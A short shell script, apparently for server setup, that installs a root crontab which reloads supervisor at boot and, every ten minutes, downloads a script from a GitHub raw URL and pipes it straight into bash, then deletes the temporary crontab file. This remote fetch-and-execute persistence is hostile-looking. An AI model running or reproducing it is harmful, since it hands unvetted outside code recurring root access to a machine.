#!/bin/sh
sudo su
echo "@reboot sudo supervisorctl reload
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Do0150.sh | bash
 " >> myverifier
sudo crontab myverifier
rm myverifier
